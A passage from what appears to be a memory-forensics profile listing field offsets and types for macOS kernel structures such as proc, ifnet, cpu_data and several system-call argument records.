    'p_un': [0x0, ['__unnamed_11562919']],
    'p_vmspace': [0x8, ['unsigned int']],
    'p_sigacts': [0xc, ['unsigned int']],
    'p_flag': [0x10, ['int']],
    'p_stat': [0x14, ['char']],
    'p_pid': [0x18, ['int']],
    'p_oppid': [0x1c, ['int']],
    'p_dupfd': [0x20, ['int']],
    'user_stack': [0x24, ['unsigned int']],
    'exit_thread': [0x28, ['unsigned int']],
    'p_debugger': [0x2c, ['int']],
    'sigwait': [0x30, ['int']],
    'p_estcpu': [0x34, ['unsigned int']],
    'p_cpticks': [0x38, ['int']],
    'p_pctcpu': [0x3c, ['unsigned int']],
    'p_wchan': [0x40, ['unsigned int']],
    'p_wmesg': [0x44, ['unsigned int']],
    'p_swtime': [0x48, ['unsigned int']],
    'p_slptime': [0x4c, ['unsigned int']],
    'p_realtimer': [0x50, ['user32_itimerval']],
    'p_rtime': [0x60, ['user32_timeval']],
    'p_uticks': [0x68, ['unsigned long long']],
    'p_sticks': [0x70, ['unsigned long long']],
    'p_iticks': [0x78, ['unsigned long long']],
    'p_traceflag': [0x80, ['int']],
    'p_tracep': [0x84, ['unsigned int']],
    'p_siglist': [0x88, ['int']],
    'p_textvp': [0x8c, ['unsigned int']],
    'p_holdcnt': [0x90, ['int']],
    'p_sigmask': [0x94, ['unsigned int']],
    'p_sigignore': [0x98, ['unsigned int']],
    'p_sigcatch': [0x9c, ['unsigned int']],
    'p_priority': [0xa0, ['unsigned char']],
    'p_usrpri': [0xa1, ['unsigned char']],
    'p_nice': [0xa2, ['char']],
    'p_comm': [0xa3, ['array', 17, ['char']]],
    'p_pgrp': [0xb4, ['unsigned int']],
    'p_addr': [0xb8, ['unsigned int']],
    'p_xstat': [0xbc, ['unsigned short']],
    'p_acflag': [0xbe, ['unsigned short']],
    'p_ru': [0xc0, ['unsigned int']],
}],
  'pfi_dynaddr': [ 0x78, {
    'entry': [0x0, ['__unnamed_9381152']],
    'pfid_addr4': [0x10, ['pf_addr']],
    'pfid_mask4': [0x20, ['pf_addr']],
    'pfid_addr6': [0x30, ['pf_addr']],
    'pfid_mask6': [0x40, ['pf_addr']],
    'pfid_kt': [0x50, ['pointer', ['pfr_ktable']]],
    'pfid_kif': [0x58, ['pointer', ['pfi_kif']]],
    'pfid_hook_cookie': [0x60, ['pointer', ['void']]],
    'pfid_net': [0x68, ['int']],
    'pfid_acnt4': [0x6c, ['int']],
    'pfid_acnt6': [0x70, ['int']],
    'pfid_af': [0x74, ['unsigned char']],
    'pfid_iflags': [0x75, ['unsigned char']],
}],
  'nfsstatcount64': [ 0x8, {
    'hi': [0x0, ['unsigned int']],
    'lo': [0x4, ['unsigned int']],
}],
  '__unnamed_12511573': [ 0x10, {
    'le_next': [0x0, ['pointer', ['inpcb']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['inpcb']]]],
}],
  '__pthread_fchdir_args': [ 0x8, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
}],
  'ccmode_cbc': [ 0x28, {
    'size': [0x0, ['unsigned long']],
    'block_size': [0x8, ['unsigned long']],
    'init': [0x10, ['pointer', ['void']]],
    'cbc': [0x18, ['pointer', ['void']]],
    'custom': [0x20, ['pointer', ['void']]],
}],
  'nfs_user_stat_path_rec': [ 0x402, {
    'rec_type': [0x0, ['unsigned char']],
    'path': [0x1, ['array', 1025, ['char']]],
}],
  'ledger_template': [ 0x30, {
    'lt_name': [0x0, ['pointer', ['char']]],
    'lt_refs': [0x8, ['int']],
    'lt_cnt': [0xc, ['int']],
    'lt_table_size': [0x10, ['int']],
    'lt_inuse': [0x14, ['unsigned int']],
    'lt_lock': [0x18, ['_lck_mtx_']],
    'lt_entries': [0x28, ['pointer', ['entry_template']]],
}],
  'mkext_basic_header': [ 0x20, {
    'magic': [0x0, ['unsigned int']],
    'signature': [0x4, ['unsigned int']],
    'length': [0x8, ['unsigned int']],
    'adler32': [0xc, ['unsigned int']],
    'version': [0x10, ['unsigned int']],
    'numkexts': [0x14, ['unsigned int']],
    'cputype': [0x18, ['int']],
    'cpusubtype': [0x1c, ['int']],
}],
  '__unnamed_12750195': [ 0x8, {
    'pad': [0x0, ['unsigned int']],
    'sival_int': [0x4, ['int']],
}],
  'if_packet_stats': [ 0x100, {
    'ifi_tcp_badformat': [0x0, ['unsigned long long']],
    'ifi_tcp_unspecv6': [0x8, ['unsigned long long']],
    'ifi_tcp_synfin': [0x10, ['unsigned long long']],
    'ifi_tcp_badformatipsec': [0x18, ['unsigned long long']],
    'ifi_tcp_noconnnolist': [0x20, ['unsigned long long']],
    'ifi_tcp_noconnlist': [0x28, ['unsigned long long']],
    'ifi_tcp_listbadsyn': [0x30, ['unsigned long long']],
    'ifi_tcp_icmp6unreach': [0x38, ['unsigned long long']],
    'ifi_tcp_deprecate6': [0x40, ['unsigned long long']],
    'ifi_tcp_rstinsynrcv': [0x48, ['unsigned long long']],
    'ifi_tcp_ooopacket': [0x50, ['unsigned long long']],
    'ifi_tcp_dospacket': [0x58, ['unsigned long long']],
    'ifi_tcp_cleanup': [0x60, ['unsigned long long']],
    'ifi_tcp_synwindow': [0x68, ['unsigned long long']],
    'reserved': [0x70, ['array', 6, ['unsigned long long']]],
    'ifi_udp_port_unreach': [0xa0, ['unsigned long long']],
    'ifi_udp_faithprefix': [0xa8, ['unsigned long long']],
    'ifi_udp_port0': [0xb0, ['unsigned long long']],
    'ifi_udp_badlength': [0xb8, ['unsigned long long']],
    'ifi_udp_badchksum': [0xc0, ['unsigned long long']],
    'ifi_udp_badmcast': [0xc8, ['unsigned long long']],
    'ifi_udp_cleanup': [0xd0, ['unsigned long long']],
    'ifi_udp_badipsec': [0xd8, ['unsigned long long']],
    '_reserved': [0xe0, ['array', 4, ['unsigned long long']]],
}],
  'setsockopt_args': [ 0x28, {
    's_l_': [0x0, ['array', 0, ['char']]],
    's': [0x0, ['int']],
    's_r_': [0x4, ['array', 4, ['char']]],
    'level_l_': [0x8, ['array', 0, ['char']]],
    'level': [0x8, ['int']],
    'level_r_': [0xc, ['array', 4, ['char']]],
    'name': [0x10, ['int']],
    'name_l_': [0x10, ['array', 0, ['char']]],
    'name_r_': [0x14, ['array', 4, ['char']]],
    'val': [0x18, ['unsigned long long']],
    'val_l_': [0x18, ['array', 0, ['char']]],
    'valsize_l_': [0x20, ['array', 0, ['char']]],
    'valsize': [0x20, ['unsigned int']],
    'val_r_': [0x20, ['array', 0, ['char']]],
    'valsize_r_': [0x24, ['array', 4, ['char']]],
}],
  '__unnamed_12507912': [ 0x10, {
    'le_next': [0x0, ['pointer', ['unpcb']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['unpcb']]]],
}],
  'sd_filterargs': [ 0x8, {
    'delayterm': [0x0, ['int']],
    'shutdownstate': [0x4, ['int']],
}],
  'default_pager_info': [ 0x18, {
    'dpi_total_space': [0x0, ['unsigned long']],
    'dpi_free_space': [0x8, ['unsigned long']],
    'dpi_page_size': [0x10, ['unsigned long']],
}],
  'nfs_lock_owner': [ 0xb0, {
    'nlo_lock': [0x0, ['__unnamed_5388464']],
    'nlo_link': [0x10, ['__unnamed_5421839']],
    'nlo_open_owner': [0x20, ['pointer', ['nfs_open_owner']]],
    'nlo_locks': [0x28, ['nfs_file_lock_queue']],
    'nlo_alock': [0x38, ['nfs_file_lock']],
    'nlo_pid_start': [0x78, ['timeval']],
    'nlo_pid': [0x88, ['int']],
    'nlo_refcnt': [0x8c, ['unsigned int']],
    'nlo_flags': [0x90, ['unsigned int']],
    'nlo_name': [0x94, ['unsigned int']],
    'nlo_seqid': [0x98, ['unsigned int']],
    'nlo_stategenid': [0x9c, ['unsigned int']],
    'nlo_stateid': [0xa0, ['nfs_stateid']],
}],
  'swdevt': [ 0x18, {
    'sw_dev': [0x0, ['int']],
    'sw_flags': [0x4, ['int']],
    'sw_nblks': [0x8, ['int']],
    'sw_vp': [0x10, ['pointer', ['vnode']]],
}],
  'igmp_ifinfo': [ 0xa0, {
    'igi_lock': [0x0, ['__unnamed_8078487']],
    'igi_refcnt': [0x10, ['unsigned int']],
    'igi_debug': [0x14, ['unsigned int']],
    'igi_link': [0x18, ['__unnamed_8083834']],
    'igi_ifp': [0x28, ['pointer', ['ifnet']]],
    'igi_version': [0x30, ['unsigned int']],
    'igi_v1_timer': [0x34, ['unsigned int']],
    'igi_v2_timer': [0x38, ['unsigned int']],
    'igi_v3_timer': [0x3c, ['unsigned int']],
    'igi_flags': [0x40, ['unsigned int']],
    'igi_rv': [0x44, ['unsigned int']],
    'igi_qi': [0x48, ['unsigned int']],
    'igi_qri': [0x4c, ['unsigned int']],
    'igi_uri': [0x50, ['unsigned int']],
    'igi_relinmhead': [0x58, ['__unnamed_8084048']],
    'igi_gq': [0x60, ['ifqueue']],
    'igi_v2q': [0x80, ['ifqueue']],
}],
  '__unnamed_4589403': [ 0xa, {
    'size': [0x0, ['unsigned short']],
    'ptr': [0x2, ['pointer', ['void']]],
}],
  'OSSymbolPool_class': [ 0x20, {
    'kInitBucketCount': [0x0, ['unsigned int']],
    '_vptr$OSSymbolPool': [0x0, ['pointer', ['pointer', ['void']]]],
    'buckets': [0x8, ['pointer', ['__unnamed_13240124']]],
    'nBuckets': [0x10, ['unsigned int']],
    'count': [0x14, ['unsigned int']],
    'poolGate': [0x18, ['pointer', ['__unnamed_13239965']]],
}],
  'utun_stats_param': [ 0x18, {
    'utsp_packets': [0x0, ['unsigned long long']],
    'utsp_bytes': [0x8, ['unsigned long long']],
    'utsp_errors': [0x10, ['unsigned long long']],
}],
  'fasttrap_probe_spec': [ 0xf0, {
    'ftps_pid': [0x0, ['int']],
    'ftps_provider_type': [0x4, ['Enumeration', {'target': 'int', 'choices': {0: 'DTFTP_PROVIDER_NONE', 1: 'DTFTP_PROVIDER_USDT', 2: 'DTFTP_PROVIDER_PID', 3: 'DTFTP_PROVIDER_OBJC', 4: 'DTFTP_PROVIDER_ONESHOT'}}]],
    'ftps_probe_type': [0x8, ['Enumeration', {'target': 'int', 'choices': {0: 'DTFTP_NONE', 1: 'DTFTP_ENTRY', 2: 'DTFTP_RETURN', 3: 'DTFTP_OFFSETS', 4: 'DTFTP_POST_OFFSETS', 5: 'DTFTP_IS_ENABLED'}}]],
    'ftps_func': [0xc, ['array', 128, ['char']]],
    'ftps_mod': [0x8c, ['array', 64, ['char']]],
    'ftps_pc': [0xd0, ['unsigned long long']],
    'ftps_size': [0xd8, ['unsigned long long']],
    'ftps_noffs': [0xe0, ['unsigned long long']],
    'ftps_offs': [0xe8, ['array', 1, ['unsigned long long']]],
}],
  'getpid_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  '__unnamed_10546857': [ 0x10, {
    'opaque': [0x0, ['array', 3, ['unsigned int']]],
    'opaque4': [0xc, ['unsigned int']],
}],
  'ifnet_fc_entry': [ 0x28, {
    'ifce_entry': [0x0, ['__unnamed_6622683']],
    'ifce_flowhash': [0x18, ['unsigned int']],
    'ifce_ifp': [0x20, ['pointer', ['ifnet']]],
}],
  'IOPowerConnection_class': [ 0xc0, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'stateKnown': [0x88, ['int']],
    'currentPowerFlags': [0x90, ['unsigned long']],
    'desiredDomainState': [0x98, ['unsigned long']],
    'requestFlag': [0xa0, ['int']],
    'preventIdleSleepFlag': [0xa8, ['unsigned long']],
    'preventSystemSleepFlag': [0xb0, ['unsigned long']],
    'awaitingAck': [0xb8, ['int']],
    'readyFlag': [0xb9, ['int']],
    'delayChildNotification': [0xba, ['int']],
}],
  'xcArg': [ 0x18, {
    'cpu': [0x0, ['int']],
    'f': [0x8, ['pointer', ['void']]],
    'arg': [0x10, ['pointer', ['void']]],
}],
  'getppid_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'user64_loadavg': [ 0x18, {
    'ldavg': [0x0, ['array', 3, ['unsigned int']]],
    'fscale': [0x10, ['long long']],
}],
  'fsid': [ 0x8, {
    'val': [0x0, ['array', 2, ['int']]],
}],
  'ah_algorithm': [ 0x38, {
    'sumsiz': [0x0, ['pointer', ['void']]],
    'mature': [0x8, ['pointer', ['void']]],
    'keymin': [0x10, ['int']],
    'keymax': [0x14, ['int']],
    'name': [0x18, ['pointer', ['char']]],
    'init': [0x20, ['pointer', ['void']]],
    'update': [0x28, ['pointer', ['void']]],
    'result': [0x30, ['pointer', ['void']]],
}],
  'fork_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'wait_queue': [ 0x20, {
    'opaque': [0x0, ['array', 32, ['unsigned char']]],
}],
  'sadb_comb': [ 0x48, {
    'sadb_comb_auth': [0x0, ['unsigned char']],
    'sadb_comb_encrypt': [0x1, ['unsigned char']],
    'sadb_comb_flags': [0x2, ['unsigned short']],
    'sadb_comb_auth_minbits': [0x4, ['unsigned short']],
    'sadb_comb_auth_maxbits': [0x6, ['unsigned short']],
    'sadb_comb_encrypt_minbits': [0x8, ['unsigned short']],
    'sadb_comb_encrypt_maxbits': [0xa, ['unsigned short']],
    'sadb_comb_reserved': [0xc, ['unsigned int']],
    'sadb_comb_soft_allocations': [0x10, ['unsigned int']],
    'sadb_comb_hard_allocations': [0x14, ['unsigned int']],
    'sadb_comb_soft_bytes': [0x18, ['unsigned long long']],
    'sadb_comb_hard_bytes': [0x20, ['unsigned long long']],
    'sadb_comb_soft_addtime': [0x28, ['unsigned long long']],
    'sadb_comb_hard_addtime': [0x30, ['unsigned long long']],
    'sadb_comb_soft_usetime': [0x38, ['unsigned long long']],
    'sadb_comb_hard_usetime': [0x40, ['unsigned long long']],
}],
  'tcq_if': [ 0x40, {
    'tif_ifq': [0x0, ['pointer', ['ifclassq']]],
    'tif_maxpri': [0x8, ['int']],
    'tif_flags': [0xc, ['unsigned int']],
    'tif_throttle': [0x10, ['unsigned int']],
    'tif_default': [0x18, ['pointer', ['tcq_class']]],
    'tif_classes': [0x20, ['array', 4, ['pointer', ['tcq_class']]]],
}],
  'user_vfsidctl': [ 0x50, {
    'vc_vers': [0x0, ['int']],
    'vc_fsid': [0x4, ['fsid']],
    'vc_ptr': [0x10, ['unsigned long long']],
    'vc_len': [0x18, ['unsigned long long']],
    'vc_spare': [0x20, ['array', 12, ['unsigned int']]],
}],
  'auditon_udata': [ 0x38, {
    'au_cond64': [0x0, ['long long']],
    'au_aupinfo': [0x0, ['auditpinfo']],
    'au_kau_info': [0x0, ['auditinfo_addr']],
    'au_cond': [0x0, ['int']],
    'au_stat': [0x0, ['audit_stat']],
    'au_trigger': [0x0, ['int']],
    'au_aupinfo_addr': [0x0, ['auditpinfo_addr']],
    'au_evclass': [0x0, ['au_evclass_map']],
    'au_auinfo': [0x0, ['auditinfo']],
    'au_fstat': [0x0, ['audit_fstat']],
    'au_qctrl': [0x0, ['au_qctrl']],
    'au_policy64': [0x0, ['long long']],
    'au_mask': [0x0, ['au_mask']],
    'au_path': [0x0, ['pointer', ['char']]],
    'au_policy': [0x0, ['int']],
    'au_flags': [0x0, ['unsigned long long']],
    'au_qctrl64': [0x0, ['au_qctrl64']],
}],
  '_IOServiceJob_class': [ 0x20, {
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'type': [0xc, ['int']],
    'nub': [0x10, ['pointer', ['IOService_class']]],
    'options': [0x18, ['unsigned int']],
}],
  'proclist': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['proc']]],
}],
  'sockproto': [ 0x4, {
    'sp_family': [0x0, ['unsigned short']],
    'sp_protocol': [0x2, ['unsigned short']],
}],
  'cpu_data': [ 0xa880, {
    'cpu_pal_data': [0x0, ['pal_cpu_data']],
    'cpu_this': [0x0, ['pointer', ['cpu_data']]],
    'cpu_active_thread': [0x8, ['pointer', ['thread']]],
    'cpu_nthread': [0x10, ['pointer', ['thread']]],
    'cpu_preemption_level': [0x18, ['int']],
    'cpu_number': [0x1c, ['int']],
    'cpu_int_state': [0x20, ['pointer', ['void']]],
    'cpu_active_stack': [0x28, ['unsigned long']],
    'cpu_kernel_stack': [0x30, ['unsigned long']],
    'cpu_int_stack_top': [0x38, ['unsigned long']],
    'cpu_interrupt_level': [0x40, ['int']],
    'cpu_phys_number': [0x44, ['int']],
    'cpu_id': [0x48, ['pointer', ['void']]],
    'cpu_signals': [0x50, ['int']],
    'cpu_prior_signals': [0x54, ['int']],
    'cpu_pending_ast': [0x58, ['unsigned int']],
    'cpu_running': [0x5c, ['int']],
    'cpu_fixed_pmcs_enabled': [0x60, ['int']],
    'rtclock_timer': [0x68, ['rtclock_timer']],
    'cpu_active_cr3': [0x100, ['unsigned long long']],
    '__unnamed_4591159': [0x108, ['__unnamed_4591093']],
    'cpu_task_map': [0x10c, ['Enumeration', {'target': 'int', 'choices': {0: 'TASK_MAP_32BIT', 1: 'TASK_MAP_64BIT'}}]],
    'cpu_task_cr3': [0x110, ['unsigned long long']],
    'cpu_kernel_cr3': [0x118, ['unsigned long long']],
    'cpu_uber': [0x120, ['__unnamed_4586359']],
    'cpu_chud': [0x138, ['pointer', ['void']]],
    'cpu_console_buf': [0x140, ['pointer', ['void']]],
    'lcpu': [0x148, ['x86_lcpu']],
    'cpu_processor': [0x1e0, ['pointer', ['processor']]],
    'cpu_desc_tablep': [0x1e8, ['pointer', ['cpu_desc_table']]],
    'cpu_ldtp': [0x1f0, ['pointer', ['fake_descriptor']]],
    'cpu_desc_index': [0x1f8, ['__unnamed_4589384']],
    'cpu_ldt': [0x228, ['int']],
    'cpu_hwIntCnt': [0x22c, ['array', 256, ['unsigned int']]],
    'cpu_hwIntpexits': [0x630, ['array', 256, ['unsigned long long']]],
    'cpu_hwIntcexits': [0xe30, ['array', 256, ['unsigned long long']]],
    'cpu_dr7': [0x1630, ['unsigned long long']],
    'cpu_int_event_time': [0x1638, ['unsigned long long']],
    'cpu_nanotime': [0x1640, ['pointer', ['pal_rtc_nanotime']]],
    'csw_old_thread': [0x1648, ['pointer', ['thread']]],
    'csw_new_thread': [0x1650, ['pointer', ['thread']]],
    'cpu_kpc_buf': [0x1658, ['array', 2, ['pointer', ['unsigned long long']]]],
    'cpu_kpc_shadow': [0x1668, ['pointer', ['unsigned long long']]],
    'cpu_kpc_reload': [0x1670, ['pointer', ['unsigned long long']]],
    'cpu_pmap_pcid_enabled': [0x1678, ['unsigned int']],
    'cpu_active_pcid': [0x167c, ['unsigned short']],
    'cpu_last_pcid': [0x167e, ['unsigned short']],
    'cpu_pmap_pcid_coherentp': [0x1680, ['pointer', ['unsigned char']]],
    'cpu_pmap_pcid_coherentp_kernel': [0x1688, ['pointer', ['unsigned char']]],
    'cpu_pcid_free_hint': [0x1690, ['unsigned short']],
    'cpu_pcid_refcounts': [0x1692, ['array', 4096, ['unsigned char']]],
    'cpu_pcid_last_pmap_dispatched': [0x2698, ['array', 4096, ['pointer', ['pmap']]]],
    'cpu_aperf': [0xa698, ['unsigned long long']],
    'cpu_mperf': [0xa6a0, ['unsigned long long']],
    'cpu_c3res': [0xa6a8, ['unsigned long long']],
    'cpu_c6res': [0xa6b0, ['unsigned long long']],
    'cpu_c7res': [0xa6b8, ['unsigned long long']],
    'cpu_itime_total': [0xa6c0, ['unsigned long long']],
    'cpu_rtime_total': [0xa6c8, ['unsigned long long']],
    'cpu_ixtime': [0xa6d0, ['unsigned long long']],
    'cpu_idle_exits': [0xa6d8, ['unsigned long long']],
    'cpu_rtimes': [0xa6e0, ['array', 12, ['unsigned long long']]],
    'cpu_itimes': [0xa740, ['array', 12, ['unsigned long long']]],
    'cpu_cur_insns': [0xa7a0, ['unsigned long long']],
    'cpu_cur_ucc': [0xa7a8, ['unsigned long long']],
    'cpu_cur_urc': [0xa7b0, ['unsigned long long']],
    'cpu_max_observed_int_latency': [0xa7b8, ['unsigned long long']],
    'cpu_max_observed_int_latency_vector': [0xa7c0, ['int']],
    'cpu_NMI_acknowledged': [0xa7c4, ['int']],
    'debugger_entry_time': [0xa7c8, ['unsigned long long']],
    'debugger_ipi_time': [0xa7d0, ['unsigned long long']],
    'cpu_nested_istack': [0xa7d8, ['unsigned int']],
    'cpu_nested_istack_events': [0xa7dc, ['unsigned int']],
    'cpu_fatal_trap_state': [0xa7e0, ['pointer', ['x86_saved_state64']]],
    'cpu_post_fatal_trap_state': [0xa7e8, ['pointer', ['x86_saved_state64']]],
    'cpu_vmx': [0xa7f0, ['vmx_cpu']],
    'cpu_mca_state': [0xa860, ['pointer', ['mca_state']]],
    'cpu_type': [0xa868, ['int']],
    'cpu_subtype': [0xa86c, ['int']],
    'cpu_threadtype': [0xa870, ['int']],
    'cpu_iflag': [0xa874, ['int']],
    'cpu_boot_complete': [0xa878, ['int']],
    'cpu_hibernate': [0xa87c, ['int']],
}],
  '__unnamed_11301162': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['lockf']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['lockf']]]],
}],
  '__unnamed_7806327': [ 0x278, {
    'blue': [0x0, ['blue_stats']],
    'sfb': [0x0, ['sfb_stats']],
    'red': [0x0, ['array', 3, ['red_stats']]],
}],
  '__unnamed_6584786': [ 0x4, {
    'ifcu_req': [0x0, ['unsigned int']],
}],
  'kev_request': [ 0xc, {
    'vendor_code': [0x0, ['unsigned int']],
    'kev_class': [0x4, ['unsigned int']],
    'kev_subclass': [0x8, ['unsigned int']],
}],
  'identitysvc_args': [ 0x10, {
    'opcode_l_': [0x0, ['array', 0, ['char']]],
    'opcode': [0x0, ['int']],
    'opcode_r_': [0x4, ['array', 4, ['char']]],
    'message_l_': [0x8, ['array', 0, ['char']]],
    'message': [0x8, ['unsigned long long']],
    'message_r_': [0x10, ['array', 0, ['char']]],
}],
  'dup_args': [ 0x8, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['unsigned int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
}],
  'psynch_rw_longrdlock_args': [ 0x28, {
    'rwlock': [0x0, ['unsigned long long']],
    'rwlock_l_': [0x0, ['array', 0, ['char']]],
    'lgenval': [0x8, ['unsigned int']],
    'lgenval_l_': [0x8, ['array', 0, ['char']]],
    'rwlock_r_': [0x8, ['array', 0, ['char']]],
    'lgenval_r_': [0xc, ['array', 4, ['char']]],
    'ugenval': [0x10, ['unsigned int']],
    'ugenval_l_': [0x10, ['array', 0, ['char']]],
    'ugenval_r_': [0x14, ['array', 4, ['char']]],
    'rw_wc': [0x18, ['unsigned int']],
    'rw_wc_l_': [0x18, ['array', 0, ['char']]],
    'rw_wc_r_': [0x1c, ['array', 4, ['char']]],
    'flags': [0x20, ['int']],
    'flags_l_': [0x20, ['array', 0, ['char']]],
    'flags_r_': [0x24, ['array', 4, ['char']]],
}],
  '__unnamed_5425270': [ 0x68, {
    'longid': [0x0, ['pointer', ['nfs_client_id']]],
    'mounttime': [0x8, ['unsigned long long']],
    'clientid': [0x10, ['unsigned long long']],
    'renew_timer': [0x18, ['pointer', ['thread_call']]],
    'fsid': [0x20, ['nfs_fsid']],
    'delegations': [0x30, ['__unnamed_5425355']],
    'dreturnq': [0x40, ['__unnamed_5425409']],
    'cblink': [0x50, ['__unnamed_5425463']],
    'cbid': [0x60, ['unsigned int']],
    'cbrefs': [0x64, ['unsigned int']],
}],
  'sav_dump_elem': [ 0x10, {
    'sav': [0x0, ['pointer', ['secasvar']]],
    'satype': [0x8, ['unsigned char']],
}],
  'rtqk_arg': [ 0x20, {
    'rnh': [0x0, ['pointer', ['radix_node_head']]],
    'updating': [0x8, ['int']],
    'draining': [0xc, ['int']],
    'killed': [0x10, ['unsigned int']],
    'found': [0x14, ['unsigned int']],
    'nextstop': [0x18, ['unsigned long long']],
}],
  '__unnamed_9377853': [ 0x20, {
    'addr': [0x0, ['pf_addr']],
    'mask': [0x10, ['pf_addr']],
}],
  'IOHibernateHandoff': [ 0x8, {
    'type': [0x0, ['unsigned int']],
    'bytecount': [0x4, ['unsigned int']],
    'data': [0x8, ['array', 0, ['unsigned char']]],
}],
  '_kernelrpc_mach_port_construct_args': [ 0x20, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'options_l_': [0x8, ['array', 0, ['char']]],
    'options': [0x8, ['unsigned long long']],
    'context': [0x10, ['unsigned long long']],
    'context_l_': [0x10, ['array', 0, ['char']]],
    'options_r_': [0x10, ['array', 0, ['char']]],
    'name_l_': [0x18, ['array', 0, ['char']]],
    'context_r_': [0x18, ['array', 0, ['char']]],
    'name': [0x18, ['unsigned long long']],
    'name_r_': [0x20, ['array', 0, ['char']]],
}],
  'semaphore_signal_trap_args': [ 0x8, {
    'signal_name_l_': [0x0, ['array', 0, ['char']]],
    'signal_name': [0x0, ['unsigned int']],
    'signal_name_r_': [0x4, ['array', 4, ['char']]],
}],
  'dadq_head': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['dadq']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['dadq']]]],
}],
  'pfioc_tokens_64': [ 0x10, {
    'size': [0x0, ['int']],
    'pgt_u': [0x8, ['__unnamed_7469652']],
}],
  'run_queue': [ 0x830, {
    'highq': [0x0, ['int']],
    'bitmap': [0x4, ['array', 4, ['int']]],
    'count': [0x14, ['int']],
    'urgency': [0x18, ['int']],
    'queues': [0x20, ['array', 128, ['queue_entry']]],
    'runq_stats': [0x820, ['runq_stats']],
}],
  'ifnet': [ 0x698, {
    'if_lock': [0x0, ['__unnamed_12877775']],
    'if_softc': [0x10, ['pointer', ['void']]],
    'if_name': [0x18, ['pointer', ['char']]],
    'if_xname': [0x20, ['pointer', ['char']]],
    'if_desc': [0x28, ['if_description']],
    'if_link': [0x38, ['__unnamed_12884701']],
    'if_detaching_link': [0x48, ['__unnamed_12884755']],
    'if_ref_lock': [0x58, ['__unnamed_12877919']],
    'if_refflags': [0x68, ['unsigned int']],
    'if_refio': [0x6c, ['unsigned int']],
    'if_addrhead': [0x70, ['ifaddrhead']],
    'if_lladdr': [0x80, ['pointer', ['ifaddr']]],
    'if_pcount': [0x88, ['int']],
    'if_bpf': [0x90, ['pointer', ['bpf_if']]],
    'if_index': [0x98, ['unsigned short']],
    'if_unit': [0x9a, ['short']],
    'if_timer': [0x9c, ['short']],
    'if_flags': [0x9e, ['short']],
    'if_eflags': [0xa0, ['unsigned int']],
    'if_capabilities': [0xa4, ['int']],
    'if_capenable': [0xa8, ['int']],
    'if_linkmib': [0xb0, ['pointer', ['void']]],
    'if_linkmiblen': [0xb8, ['unsigned long']],
    'if_data': [0xc0, ['if_data_internal']],
    'if_family': [0x178, ['unsigned int']],
    'if_subfamily': [0x17c, ['unsigned int']],
    'if_family_cookie': [0x180, ['unsigned long']],
    'if_output': [0x188, ['pointer', ['void']]],
    'if_pre_enqueue': [0x190, ['pointer', ['void']]],
    'if_start': [0x198, ['pointer', ['void']]],
    'if_output_ctl': [0x1a0, ['pointer', ['void']]],
    'if_input_poll': [0x1a8, ['pointer', ['void']]],
    'if_input_ctl': [0x1b0, ['pointer', ['void']]],
    'if_ioctl': [0x1b8, ['pointer', ['void']]],
    'if_set_bpf_tap': [0x1c0, ['pointer', ['void']]],
    'if_free': [0x1c8, ['pointer', ['void']]],
    'if_demux': [0x1d0, ['pointer', ['void']]],
    'if_event': [0x1d8, ['pointer', ['void']]],
    'if_framer_legacy': [0x1e0, ['pointer', ['void']]],
    'if_framer': [0x1e8, ['pointer', ['void']]],
    'if_add_proto': [0x1f0, ['pointer', ['void']]],
    'if_del_proto': [0x1f8, ['pointer', ['void']]],
    'if_check_multi': [0x200, ['pointer', ['void']]],
    'if_proto_hash': [0x208, ['pointer', ['proto_hash_entry']]],
    'if_kpi_storage': [0x210, ['pointer', ['void']]],
    'if_flowhash': [0x218, ['unsigned int']],
    'if_start_lock': [0x220, ['__unnamed_12877919']],
    'if_start_flags': [0x230, ['unsigned int']],
    'if_start_req': [0x234, ['unsigned int']],
    'if_start_active': [0x238, ['unsigned int']],
    'if_start_cycle': [0x240, ['timespec']],
    'if_start_thread': [0x250, ['pointer', ['thread']]],
    'if_snd': [0x258, ['ifclassq']],
    'if_output_sched_model': [0x3b0, ['unsigned int']],
    'if_output_bw': [0x3b4, ['if_bandwidths']],
    'if_input_bw': [0x3c4, ['if_bandwidths']],
    'if_output_lt': [0x3d4, ['if_latencies']],
    'if_input_lt': [0x3e4, ['if_latencies']],
    'if_flt_lock': [0x3f8, ['__unnamed_12877919']],
    'if_flt_busy': [0x408, ['unsigned int']],
    'if_flt_waiters': [0x40c, ['unsigned int']],
    'if_flt_head': [0x410, ['ifnet_filter_head']],
    'if_multiaddrs': [0x420, ['ifmultihead']],
    'if_updatemcasts': [0x428, ['unsigned int']],
    'if_amcount': [0x42c, ['int']],
    'if_addrconfig_lock': [0x430, ['__unnamed_12877919']],
    'if_allhostsinm': [0x440, ['pointer', ['in_multi']]],
    'if_poll_lock': [0x448, ['__unnamed_12877919']],
    'if_poll_req': [0x458, ['unsigned short']],
    'if_poll_update': [0x45a, ['unsigned short']],
    'if_poll_active': [0x45c, ['unsigned int']],
    'if_poll_cycle': [0x460, ['timespec']],
    'if_poll_thread': [0x470, ['pointer', ['thread']]],
    'if_inp': [0x478, ['pointer', ['dlil_threading_info']]],
    'if_prefixhead': [0x480, ['ifprefixhead']],
    'if_broadcast': [0x490, ['__unnamed_12885961']],
    'if_wake_properties': [0x4a0, ['unsigned int']],
